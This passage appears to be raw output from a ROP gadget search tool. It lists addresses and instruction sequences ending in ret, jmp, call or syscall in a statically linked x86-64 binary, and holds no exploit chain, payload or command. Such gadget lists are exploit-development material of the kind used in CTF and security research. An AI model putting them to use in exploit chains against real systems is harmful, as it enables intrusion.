0x000000000040d34f : movsxd rdx, dword ptr [rdi + rdx*4] ; add rdx, rdi ; jmp rdx
0x0000000000449de9 : movsxd rdx, eax ; jmp 0x449b93
0x000000000045a760 : movsxd rsi, dword ptr [r8 + r9*4] ; add rsi, r8 ; jmp rsi
0x000000000045a761 : movsxd rsi, dword ptr [rax + rcx*4] ; add rsi, r8 ; jmp rsi
0x00000000004468fc : movsxd rsi, esi ; ret 0x7520
0x00000000004479bf : movups xmmword ptr [r11], xmm4 ; ret
0x0000000000447a46 : movups xmmword ptr [r11], xmm8 ; ret
0x0000000000447a47 : movups xmmword ptr [rbx], xmm0 ; ret
0x00000000004479c0 : movups xmmword ptr [rbx], xmm4 ; ret
0x00000000004479bb : movups xmmword ptr [rcx - 0x30], xmm0 ; movups xmmword ptr [r11], xmm4 ; ret
0x00000000004479ba : movups xmmword ptr [rcx - 0x30], xmm8 ; movups xmmword ptr [r11], xmm4 ; ret
0x0000000000447a42 : movups xmmword ptr [rdi + 0x30], xmm7 ; movups xmmword ptr [r11], xmm8 ; ret
0x00000000004477a2 : movups xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x0000000000447929 : movups xmmword ptr [rdi + rdx - 0x20], xmm3 ; ret
0x0000000000447906 : movups xmmword ptr [rdi + rdx - 0x40], xmm7 ; ret
0x000000000044779f : movups xmmword ptr [rdi], xmm0 ; movups xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x000000000048aef5 : movups xmmword ptr [rsp - 0x28], xmm0 ; ret
0x0000000000475951 : movzx eax, al ; add rsp, 0x58 ; ret
0x00000000004884ec : movzx eax, al ; neg eax ; ret
0x0000000000484db9 : movzx eax, al ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000044f140 : movzx eax, al ; xor edx, edx ; add eax, 1 ; push rax ; call rbx
0x0000000000415e20 : movzx eax, bpl ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000048e14e : movzx eax, byte ptr [rax] ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x0000000000417021 : movzx eax, byte ptr [rax] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000041350e : movzx eax, byte ptr [rax] ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000004190af : movzx eax, byte ptr [rax] ; ret
0x000000000046bdca : movzx eax, byte ptr [rdi + rax] ; mov rax, qword ptr [rsi + rax*8] ; jmp rax
0x0000000000426538 : movzx eax, byte ptr [rdi + rdx] ; sub eax, ecx ; ret
0x000000000042c8d0 : movzx eax, byte ptr [rdi] ; movzx ecx, byte ptr [rsi] ; sub eax, ecx ; ret
0x000000000042c410 : movzx eax, byte ptr [rdi] ; movzx edx, byte ptr [rsi] ; sub eax, edx ; ret
0x0000000000426553 : movzx eax, byte ptr [rdi] ; sub eax, ecx ; ret
0x0000000000417030 : movzx eax, byte ptr [rdx] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000413520 : movzx eax, byte ptr [rdx] ; ret
0x0000000000415e21 : movzx eax, ch ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000448a50 : movzx eax, cl ; pop rbx ; ret
0x0000000000446f5a : movzx ecx, byte ptr [rsi + rdx + 3] ; test cl, cl ; jne 0x446f59 ; ret
0x000000000044700a : movzx ecx, byte ptr [rsi + rdx + 3] ; test cl, cl ; jne 0x447009 ; ret
0x000000000042d9f4 : movzx ecx, byte ptr [rsi - 1] ; sub eax, ecx ; ret
0x0000000000447878 : movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x0000000000426550 : movzx ecx, byte ptr [rsi] ; movzx eax, byte ptr [rdi] ; sub eax, ecx ; ret
0x000000000042c8d3 : movzx ecx, byte ptr [rsi] ; sub eax, ecx ; ret
0x000000000040dbd3 : movzx edx, byte ptr [rdi] ; test dl, dl ; jne 0x40dbbb ; ret
0x0000000000426711 : movzx edx, byte ptr [rdx + rcx] ; sub eax, edx ; ret
0x000000000042ab88 : movzx edx, byte ptr [rsi + rcx] ; sub eax, edx ; ret
0x000000000042c858 : movzx edx, byte ptr [rsi + rcx] ; sub eax, edx ; vzeroupper ; ret
0x00000000004265a3 : movzx edx, byte ptr [rsi + rdx] ; sub eax, edx ; ret
0x0000000000446924 : movzx edx, byte ptr [rsi - 0x10] ; sub eax, edx ; ret
0x0000000000446984 : movzx edx, byte ptr [rsi - 0xa] ; sub eax, edx ; ret
0x0000000000446974 : movzx edx, byte ptr [rsi - 0xb] ; sub eax, edx ; ret
0x0000000000446964 : movzx edx, byte ptr [rsi - 0xc] ; sub eax, edx ; ret
0x0000000000446954 : movzx edx, byte ptr [rsi - 0xd] ; sub eax, edx ; ret
0x0000000000446944 : movzx edx, byte ptr [rsi - 0xe] ; sub eax, edx ; ret
0x0000000000446934 : movzx edx, byte ptr [rsi - 0xf] ; sub eax, edx ; ret
0x0000000000435ad0 : movzx edx, byte ptr [rsi - 1] ; mov byte ptr [rdi - 1], dl ; ret
0x000000000042d7a7 : movzx edx, byte ptr [rsi - 1] ; sub eax, edx ; ret
0x000000000044690b : movzx edx, byte ptr [rsi - 9] ; sub eax, edx ; ret
0x00000000004361b0 : movzx edx, byte ptr [rsi] ; mov byte ptr [rdi], dl ; ret
0x000000000042c413 : movzx edx, byte ptr [rsi] ; sub eax, edx ; ret
0x000000000042c439 : movzx edx, dl ; sub eax, edx ; ret
0x0000000000435a50 : movzx edx, word ptr [rsi - 2] ; mov word ptr [rdi - 2], dx ; ret
0x0000000000436140 : movzx edx, word ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x000000000045b42b : mul byte ptr [rip - 0xcf78c00] ; ret
0x0000000000473457 : mul byte ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; push rdi ; xor byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret
0x000000000044a4b3 : neg eax ; jmp 0x44a47c
0x00000000004498f7 : neg eax ; mov dword ptr fs:[rcx], eax ; or rax, 0xffffffffffffffff ; ret
0x00000000004190ef : neg eax ; ret
0x0000000000494a44 : nop ; adc dl, bh ; call qword ptr [rax]
0x0000000000494204 : nop ; adc ecx, edi ; call rax
0x000000000049483c : nop ; adc edi, edx ; jmp qword ptr [rsi]
0x0000000000435207 : nop ; add byte ptr [rax], al ; add byte ptr [rax - 0x7f], cl ; ret 0x80
0x000000000044bc57 : nop ; add byte ptr [rax], al ; add byte ptr [rcx - 0x75], cl ; jge 0x44bc68 ; call r12
0x000000000042ce5c : nop ; add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00000000004b49fd : nop ; add byte ptr [rax], al ; mov al, 0 ; std ; jmp qword ptr [rdx]
0x0000000000475b8c : nop ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x000000000044f27f : nop ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000487e8f : nop ; add rsp, 8 ; ret
0x0000000000494234 : nop ; and cl, bh ; call rax
0x000000000048579f : nop ; call rax
0x000000000044f9b0 : nop ; call rsi
0x0000000000494f0c : nop ; cli ; jmp qword ptr [rax]
0x0000000000494d34 : nop ; cmp bh, dl ; jmp qword ptr [rax]
0x000000000044c92f : nop ; cmp rcx, qword ptr [rax + 0x10] ; jae 0x44c928 ; ret
0x000000000049530c : nop ; cmpsb byte ptr [rsi], byte ptr [rdi] ; cli ; jmp rax
0x00000000004945d8 : nop ; cmpsd dword ptr [rsi], dword ptr [rdi] ; stc ; jmp rax
0x00000000004b2fec : nop ; jbe 0x4b2ff6 ; add byte ptr [rax], ah ; or bh, ah ; jmp qword ptr [rax]
0x000000000048282f : nop ; jmp rdx
0x0000000000400bcf : nop ; leave ; ret
0x000000000042fddf : nop ; mov dl, byte ptr [rsi - 1] ; mov byte ptr [rdi - 1], dl ; ret
0x0000000000419b33 : nop ; mov dword ptr [rip + 0x2a225a], eax ; ret
0x000000000042ffbf : nop ; mov dx, word ptr [rsi - 2] ; mov word ptr [rdi - 2], dx ; ret
0x000000000048541f : nop ; mov eax, 0x27 ; syscall
0x000000000047563f : nop ; mov eax, 0x3f ; syscall
0x000000000044c61f : nop ; mov eax, 0x63 ; syscall
0x0000000000474f0f : nop ; mov eax, 0xc9 ; syscall
0x000000000044c6a4 : nop ; mov eax, 0xca ; syscall
0x000000000041744f : nop ; mov eax, 0xffffffff ; ret
0x000000000047fe2f : nop ; mov eax, 1 ; pop rbx ; ret
0x000000000043037f : nop ; mov edx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004450af : nop ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; lea rax, [rdi + 3] ; ret
0x0000000000471ed9 : nop ; mov qword ptr [rax], rdx ; xor eax, eax ; ret
0x00000000004199b3 : nop ; mov qword ptr [rip + 0x29fe8d], rax ; ret
0x00000000004199a3 : nop ; mov qword ptr [rip + 0x29fe95], rax ; ret
0x0000000000419953 : nop ; mov qword ptr [rip + 0x29fe9d], rax ; ret
0x0000000000419943 : nop ; mov qword ptr [rip + 0x29feb5], rax ; ret
0x000000000048d30f : nop ; mov rax, qword ptr [rdi + 0x98] ; ret
0x000000000048b07f : nop ; mov rax, qword ptr [rsi + 0xb8] ; ret
0x000000000048e21f : nop ; mov rax, qword ptr [rsi + 8] ; ret
0x0000000000444b4f : nop ; movdqu xmm0, xmmword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x0000000000494c60 : nop ; or al, 0xfa ; call qword ptr [rax]
0x000000000046f24f : nop ; or byte ptr [rbx + 0xc], 0x40 ; jmp 0x46f21e
0x000000000046f24e : nop ; or byte ptr [rbx + 0xc], 0x40 ; jmp 0x46f21f
0x0000000000494c68 : nop ; or edi, edx ; call qword ptr [rax]
0x0000000000400b5d : nop ; pop rbp ; ret
0x00000000004004cf : nop ; ret
0x00000000004944f8 : nop ; ret 0xfff9
0x00000000004944f4 : nop ; sar cl, 0xff ; nop ; ret 0xfff9
0x00000000004947a4 : nop ; sar ecx, cl ; jmp rax
0x0000000000494224 : nop ; sbb edi, ecx ; call rax
0x000000000049462c : nop ; scasb al, byte ptr [rdi] ; stc ; jmp rax
0x0000000000418c6f : nop ; sub edx, dword ptr [rax + 0x10] ; mov eax, dword ptr [rdi + 0x10] ; sub eax, edx ; ret
0x00000000004150bf : nop ; xor eax, eax ; ret
0x000000000040eb78 : nop dword ptr [rax + rax] ; call qword ptr [rbx]
0x000000000041a608 : nop dword ptr [rax + rax] ; call rax
0x00000000004859b8 : nop dword ptr [rax + rax] ; call rbx
0x0000000000444a8b : nop dword ptr [rax + rax] ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x0000000000400a93 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x00000000004120d8 : nop dword ptr [rax + rax] ; pop rbx ; ret
0x0000000000400a5b : nop dword ptr [rax + rax] ; ret
0x0000000000446e5b : nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x000000000047496c : nop dword ptr [rax] ; add rax, 1 ; ret
0x0000000000423dbd : nop dword ptr [rax] ; mov eax, 0x16 ; ret
0x0000000000449e5c : nop dword ptr [rax] ; mov eax, 0x18 ; syscall
0x00000000004498dd : nop dword ptr [rax] ; mov eax, 0x25 ; syscall
0x0000000000471fd5 : nop dword ptr [rax] ; mov eax, 0xffffffff ; ret
0x000000000044a55d : nop dword ptr [rax] ; mov eax, 3 ; syscall
0x000000000044a2dc : nop dword ptr [rax] ; mov eax, 8 ; syscall
0x000000000041b07c : nop dword ptr [rax] ; mov rax, rdx ; ret
0x0000000000400ad5 : nop dword ptr [rax] ; pop rbp ; ret
0x000000000044907c : nop dword ptr [rax] ; pop rbx ; ret
0x000000000041a5fd : nop dword ptr [rax] ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x0000000000418d81 : nop dword ptr [rax] ; ret
0x0000000000414ffd : nop dword ptr [rax] ; xor eax, eax ; jmp 0x414fcd
0x0000000000417585 : nop dword ptr [rax] ; xor eax, eax ; ret
0x000000000044a1d9 : nop dword ptr [rax] ; xor eax, eax ; syscall
0x0000000000401324 : nop dword ptr [rax] ; xor edi, edi ; mov eax, edx ; syscall
0x00000000004859b7 : nop dword ptr cs:[rax + rax] ; call rbx
0x000000000040eb77 : nop word ptr [rax + rax] ; call qword ptr [rbx]
0x000000000041a607 : nop word ptr [rax + rax] ; call rax
0x0000000000484d2a : nop word ptr [rax + rax] ; pop rbx ; ret
0x0000000000474752 : nop word ptr [rax + rax] ; ret
0x0000000000448c5a : nop word ptr [rax + rax] ; xor eax, eax ; ret
0x0000000000412b09 : not edx ; and rdx, 0xfffffffffffffffc ; add rdx, rcx ; jmp 0x412b29
0x0000000000412b08 : not rdx ; and rdx, 0xfffffffffffffffc ; add rdx, rcx ; jmp 0x412b2a
0x000000000042ad07 : or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043fd3f : or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042ad35 : or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000475a72 : or al, 0 ; add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x0000000000475a21 : or al, 0 ; add byte ptr [rax], al ; mov eax, ecx ; syscall
0x000000000041e56c : or al, 0 ; add byte ptr [rax], al ; mov rax, rsi ; ret
0x0000000000429d28 : or al, 0 ; add byte ptr [rbp - 0x77], cl ; retf
0x0000000000473d98 : or al, 0 ; add byte ptr [rbx + rax - 0xd], dh ; ret
0x000000000046beb8 : or al, 0 ; add byte ptr [rcx + 1], al ; ret 0x8b48
0x0000000000468f25 : or al, 0x13 ; add rdx, r12 ; call qword ptr [r10 + rax*8]
0x0000000000426536 : or al, 0x16 ; movzx eax, byte ptr [rdi + rdx] ; sub eax, ecx ; ret
0x000000000041e53a : or al, 0x1e ; mov rax, rsi ; pop rbx ; ret
0x0000000000413c13 : or al, 0x24 ; mov rdi, rbx ; call rax
0x000000000047fa89 : or al, 0x37 ; jae 0x47fa37 ; xor eax, eax ; ret
0x0000000000424eb0 : or al, 0x39 ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x000000000046f252 : or al, 0x40 ; jmp 0x46f21b
0x000000000046f251 : or al, 0x40 ; jmp 0x46f21c
0x000000000044a52d : or al, 0x48 ; add esp, 0x10 ; pop rbx ; ret
0x0000000000416f23 : or al, 0x48 ; mov dword ptr [rsp], edi ; call 0x4131b7
0x0000000000401231 : or al, 0x48 ; mov eax, dword ptr [rsp + 0x18] ; call rax
0x0000000000485173 : or al, 0x5b ; pop rbp ; pop r12 ; ret
0x000000000049686c : or al, 0x76 ; sti ; jmp qword ptr [rax]
0x000000000046ed03 : or al, 0x7e ; ret 0x8944
0x0000000000400ec0 : or al, 0x81 ; retf 0x440
0x0000000000459013 : or al, 0x83 ; inc byte ptr [rbx] ; je 0x459027 ; ret
0x000000000045e1eb : or al, 0x83 ; ret
0x00000000004238a6 : or al, 0x83 ; retf 0x8902
0x00000000004489f1 : or al, 0x86 ; add rcx, rsi ; jmp rcx
0x000000000046347a : or al, 0x89 ; ret 0xc689
0x0000000000448a7b : or al, 0x89 ; ret 0xe283
0x00000000004251a3 : or al, 0x8a ; lea r10, [r10 + r9] ; jmp r10
0x000000000043b664 : or al, 0x8a ; mov eax, dword ptr [rdx + rax*4] ; sub eax, ecx ; ret
0x000000000043378d : or al, 0x8b ; add r9, r11 ; jmp r9
0x000000000042e20d : or al, 0x8b ; lea r9, [r11 + r9] ; jmp r9
0x0000000000475b48 : or al, 0x8e ; add eax, dword ptr [rcx + rdx] ; ret
0x000000000042cb3f : or al, 0x93 ; add rcx, r11 ; jmp rcx
0x000000000044491b : or al, 0x93 ; lea rcx, [r11 + rcx] ; jmp rcx
0x000000000042e211 : or al, 0xb ; jmp r9
0x000000000044491f : or al, 0xb ; jmp rcx
0x0000000000485a35 : or al, 0xca ; jmp 0x485a45
0x000000000047fda0 : or al, 0xcb ; and eax, dword ptr [rax] ; jne 0x47fddc ; call qword ptr [rip + 0x23cab4]
0x0000000000411cf8 : or al, 0xe8 ; ret 0xec
0x0000000000456f4f : or al, 0xe9 ; ret
0x0000000000471c7c : or al, 0xeb ; ret 0x5590
0x000000000040401f : or al, 0xf ; retf 0xd289
0x0000000000435cd3 : or al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x0000000000466bdd : or al, 0xf6 ; ret 0xf01
0x0000000000494c65 : or al, 0xfa ; call qword ptr [rax + 0x10fffa0b]
0x0000000000494c61 : or al, 0xfa ; call qword ptr [rax]
0x0000000000494ae5 : or al, 0xfa ; call rdx
0x0000000000494c25 : or al, 0xfa ; jmp qword ptr [rax + 0x20fffa0b]
0x0000000000494c21 : or al, 0xfa ; jmp qword ptr [rax]
0x0000000000423661 : or al, 9 ; ret 0xbae9
0x000000000047fc63 : or al, bh ; dec dword ptr [rax - 0x73] ; push rbp ; add dword ptr [rax + 0x39], ecx ; ret 0x1272
0x0000000000473d4b : or al, byte ptr [rax] ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x000000000042aee7 : or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043e8d1 : or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042af15 : or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00000000004ac39d : or al, byte ptr [rax] ; add byte ptr [rax], ah ; sub dh, dh ; jmp qword ptr [rax]
0x000000000048d03a : or al, byte ptr [rax] ; add byte ptr [rax], al ; mov edi, 1 ; call rax
0x000000000044af21 : or al, byte ptr [rax] ; add byte ptr [rax], al ; syscall
0x0000000000428838 : or al, byte ptr [rax] ; add byte ptr [rbp - 0x77], cl ; retf
0x0000000000495aa0 : or al, byte ptr [rbx + rdi*8 - 1] ; ret 0xfb43
0x00000000004076fd : or al, byte ptr [rbx - 0x7bf0fd07] ; ret
0x000000000040ab8c : or al, byte ptr [rbx - 0x7bf0fd07] ; ret 0x18
0x000000000044cee6 : or al, byte ptr [rcx + rcx*8 - 0x7cb7ed8c] ; ret 0x4801
0x00000000004b411b : or al, byte ptr [rcx] ; ret
0x000000000040962e : or al, ch ; cld ; retf 0xffff
0x000000000040958d : or al, ch ; popfq ; retf
0x00000000004096d4 : or al, ch ; push rsi ; retf 0xffff
0x00000000004074f7 : or al, ch ; ret
0x000000000040ae68 : or al, ch ; ret 0xffb2
0x000000000040725f : or al, ch ; retf
0x000000000041d8c7 : or al, ch ; xchg eax, ebx ; ret 0xffff
0x00000000004b2ff1 : or bh, ah ; jmp qword ptr [rax]
0x0000000000424d90 : or bh, dh ; ret 0
0x0000000000494c31 : or bh, dl ; call qword ptr [rax]
0x0000000000494a75 : or bh, dl ; jmp rax
0x0000000000494c75 : or bh, dl ; push qword ptr [rax + 9] ; cli ; jmp rax
0x000000000041b07a : or bl, al ; nop dword ptr [rax] ; mov rax, rdx ; ret
0x000000000046b461 : or bl, bpl ; retf
0x0000000000405ead : or bl, byte ptr [rbx + 0x31] ; rcr byte ptr [rbp + 0x41], 0x5c ; ret
0x000000000048ea2d : or bl, ch ; adc byte ptr [rax - 0x7d], cl ; ret
0x000000000046b462 : or bl, ch ; retf
0x0000000000435e93 : or bl, dh ; movq qword ptr [rdi], mm1 ; ret
0x000000000044acc7 : or bl, dh ; ret
0x0000000000450626 : or byte ptr [r15], 0x8e ; ret 1
0x0000000000411ed1 : or byte ptr [r8 + 0x29], r9b ; ret
0x000000000040e21d : or byte ptr [r8 + 0x39], cl ; ret
0x0000000000451973 : or byte ptr [r8 + 0xf], cl ; ret
0x00000000004847bf : or byte ptr [r8 + 2], r15b ; ret
0x0000000000411f9f : or byte ptr [r8 - 0x3f], r9b ; sti ; add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret
0x000000000047f5ca : or byte ptr [r8 - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x0000000000442dc8 : or byte ptr [r8 - 0x77], cl ; or byte ptr [rax - 0x77], cl ; clc ; ret
0x000000000047fab5 : or byte ptr [r8 - 0x7b], cl ; sal byte ptr [rsp + rsi + 0x48], 0x89 ; ret
0x0000000000478e42 : or byte ptr [r8 - 0x7b], r9b ; ror byte ptr [rdi], 0x84 ; ret
0x000000000040b982 : or byte ptr [r8 - 0x7b], r9b ; ror byte ptr [rdi], 0x84 ; retf 0xffe7
0x0000000000484804 : or byte ptr [r9 + 0x2b802], r9b ; add byte ptr [rax], al ; ret
0x000000000048ca97 : or byte ptr [r9 + 0x63], r9b ; add al, 0x86 ; add rax, r14 ; jmp rax
0x0000000000442e87 : or byte ptr [r9 - 0x76b7f7be], cl ; clc ; ret
0x0000000000411ed2 : or byte ptr [rax + 0x29], cl ; ret
0x0000000000413705 : or byte ptr [rax + 0x2b], cl ; push rbx ; cmp byte ptr [rax + 0x39], cl ; ret 0x2175
0x000000000040e21e : or byte ptr [rax + 0x39], cl ; ret
0x0000000000453228 : or byte ptr [rax + 0x39], cl ; ret 0x8e0f
0x0000000000482ce8 : or byte ptr [rax + 0x39], cl ; retf
0x00000000004190a9 : or byte ptr [rax + 0x39], cl ; sal byte ptr [rbx + 0x21], 1 ; movzx eax, byte ptr [rax] ; ret
0x00000000004ad38e : or byte ptr [rax + 0xb], cl ; add dh, byte ptr [rbx + 0xa] ; ret
0x0000000000451974 : or byte ptr [rax + 0xf], cl ; ret
0x000000000041a156 : or byte ptr [rax + 0xf], cl ; scasd eax, dword ptr [rdi] ; ret 0x8948
0x000000000048694c : or byte ptr [rax + 1], bh ; pop rbx ; pop rbp ; ret
0x000000000047d8b1 : or byte ptr [rax + 1], cl ; ret
0x00000000004847c0 : or byte ptr [rax + 2], bh ; ret
0x0000000000411fa0 : or byte ptr [rax - 0x3f], cl ; sti ; add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret
0x0000000000485a32 : or byte ptr [rax - 0x73], cl ; or al, 0xca ; jmp 0x485a48
0x00000000004199f3 : or byte ptr [rax - 0x75], cl ; adc byte ptr [rcx - 0x7d], al ; ret
0x000000000044b134 : or byte ptr [rax - 0x75], cl ; and al, 0x10 ; call rax
0x00000000004876f5 : or byte ptr [rax - 0x77], cl ; add ebp, eax ; ret 0xf992
0x000000000044bb12 : or byte ptr [rax - 0x77], cl ; call 0xffffffffe144187b
0x0000000000442dcd : or byte ptr [rax - 0x77], cl ; clc ; ret
0x000000000047f5cb : or byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x000000000044ad4e : or byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; ret
0x0000000000416fcb : or byte ptr [rax - 0x77], cl ; fistp word ptr [rbx + 0x5d] ; jmp rax
0x000000000046b45e : or byte ptr [rax - 0x77], cl ; or bl, bpl ; retf
0x0000000000442dc9 : or byte ptr [rax - 0x77], cl ; or byte ptr [rax - 0x77], cl ; clc ; ret
0x000000000047f970 : or byte ptr [rax - 0x77], cl ; ret
0x000000000041161b : or byte ptr [rax - 0x77], cl ; retf 0x294c
0x0000000000485663 : or byte ptr [rax - 0x77], cl ; retf 0xc148
0x000000000046b45d : or byte ptr [rax - 0x77], r9b ; or bl, bpl ; retf
0x00000000004895ba : or byte ptr [rax - 0x77], r9b ; ret
0x000000000047f4f8 : or byte ptr [rax - 0x7b], cl ; push qword ptr [rbp - 0x2e] ; ret
0x0000000000478e43 : or byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x84 ; ret
0x000000000040b983 : or byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x84 ; retf 0xffe7
0x000000000048980e : or byte ptr [rax - 0x7b], cl ; sal byte ptr [rax + rax*8 + 0x49], 0x83 ; ret 0xf608
0x000000000047fab6 : or byte ptr [rax - 0x7b], cl ; sal byte ptr [rsp + rsi + 0x48], 0x89 ; ret
0x0000000000489867 : or byte ptr [rax - 0x7b], cl ; sal byte ptr [rsp + rsi*4 + 0x48], 0x83 ; ret 0xf608
0x000000000041f680 : or byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x000000000045bec0 : or byte ptr [rax - 0x7d], cl ; call qword ptr [rbx]
0x000000000044b4e2 : or byte ptr [rax - 0x7d], cl ; ret
0x000000000047b6f7 : or byte ptr [rax - 0x7d], cl ; ret 0x101
0x000000000047dd62 : or byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000044cda0 : or byte ptr [rax - 0x7d], cl ; ret 0xf01
0x00000000004125b6 : or byte ptr [rax - 1], bh ; pop rbx ; pop rbp ; ret
0x0000000000494c40 : or byte ptr [rax], 0xfa ; jmp qword ptr [rax]
0x00000000004726ee : or byte ptr [rax], al ; add al, 0 ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x000000000041af2d : or byte ptr [rax], al ; add al, ch ; retf
0x000000000041ad1b : or byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x840f
0x000000000042b1b7 : or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043ea71 : or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042b0f5 : or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000417d47 : or byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x000000000045191a : or byte ptr [rax], al ; add byte ptr [rax], al ; add dh, dh ; ret 0x4801
0x000000000045b842 : or byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0xe ; syscall
0x000000000045b6e5 : or byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, ecx ; syscall
0x0000000000448ac5 : or byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x000000000044f191 : or byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000044a2e1 : or byte ptr [rax], al ; add byte ptr [rax], al ; syscall
0x00000000004289b8 : or byte ptr [rax], al ; add byte ptr [rbp - 0x77], cl ; retf
0x000000000041ff56 : or byte ptr [rax], al ; add byte ptr [rcx + rdi - 0x3e], cl ; jne 0x41ff29 ; ret
0x0000000000420f2c : or byte ptr [rax], al ; add byte ptr [rdi], cl ; xchg eax, ebx ; ret 0x3d83
0x000000000040d34c : or byte ptr [rax], al ; movsxd rdx, dword ptr [rdi + rdx*4] ; add rdx, rdi ; jmp rdx
0x000000000044012e : or byte ptr [rax], r8b ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000048d28f : or byte ptr [rbp + 0x1a], dh ; mov rax, qword ptr [rax] ; ret
0x0000000000485b6b : or byte ptr [rbp + 0x39481e04], cl ; ret 0x830f
0x0000000000482c41 : or byte ptr [rbp + 0x39], cl ; ret 0x8b48
0x0000000000485886 : or byte ptr [rbp + 0x440f4cf6], al ; ret
0x000000000048d2fe : or byte ptr [rbp + 4], dh ; mov qword ptr [rax], rdx ; ret
0x00000000004828c3 : or byte ptr [rbp + rcx*4 + 0x24], cl ; ret 0x8d4a
0x000000000041d6f2 : or byte ptr [rbp - 0x75], cl ; push rax ; or byte ptr [rcx - 0xa], al ; ret 0xf04
0x00000000004922a3 : or byte ptr [rbp - 0x77], cl ; ret
0x000000000044ab4c : or byte ptr [rbp - 0x7b], cl ; test byte ptr [rdi], 0x94 ; ret 0xc221
0x000000000044a663 : or byte ptr [rbp - 0x7b], cl ; test byte ptr [rdi], 0x94 ; ret 0xca21
0x0000000000486c07 : or byte ptr [rbx + 0x394401c2], al ; retf 0x830f
0x0000000000413fd6 : or byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x0000000000401c95 : or byte ptr [rbx + 0x5d], bl ; ret
0x000000000044b99e : or byte ptr [rbx + 0x94801e2], al ; ret 0x8949
0x000000000041e637 : or byte ptr [rbx + 0x94807e0], al ; ret
0x000000000041e636 : or byte ptr [rbx + 0x94807e0], r8b ; ret
0x000000000046f250 : or byte ptr [rbx + 0xc], 0x40 ; jmp 0x46f21d
0x0000000000463157 : or byte ptr [rbx - 0x1776cf3b], al ; pop rbx ; pop rbp ; ret
0x00000000004106c9 : or byte ptr [rbx - 0x76fefbbe], al ; ret 0xe281
0x000000000044c784 : or byte ptr [rbx], al ; add byte ptr [rax], al ; mov esi, 0x80 ; syscall
0x000000000047b769 : or byte ptr [rbx], al ; add byte ptr [rax], al ; ret
0x00000000004845ab : or byte ptr [rcx + 0x29], cl ; ret 0x894c
0x0000000000484805 : or byte ptr [rcx + 0x2b802], cl ; add byte ptr [rax], al ; ret
0x000000000048169d : or byte ptr [rcx + 0x33], cl ; add byte ptr [r8 + 9], r9b ; ret 0x840f
0x0000000000479292 : or byte ptr [rcx + 0x33], cl ; add dword ptr [rax + 9], ecx ; ret 0x1475
0x0000000000479264 : or byte ptr [rcx + 0x33], cl ; add dword ptr [rax + 9], ecx ; ret 0xe75
0x0000000000410f98 : or byte ptr [rcx + 0x415d5bd0], cl ; pop rsp ; pop r13 ; ret
0x0000000000410d87 : or byte ptr [rcx + 0x415d5bd8], cl ; pop rsp ; pop r13 ; ret
0x000000000048a4e5 : or byte ptr [rcx + 0x415d5be8], cl ; pop rsp ; pop r13 ; ret
0x000000000046fcb3 : or byte ptr [rcx + 0x415d5bf0], cl ; pop rsp ; pop r13 ; ret
0x000000000048ca98 : or byte ptr [rcx + 0x63], cl ; add al, 0x86 ; add rax, r14 ; jmp rax
0x000000000046ece9 : or byte ptr [rcx + 0xf], al ; mov dh, 0x40 ; add dword ptr [rcx - 0x77], eax ; ret 0xe883
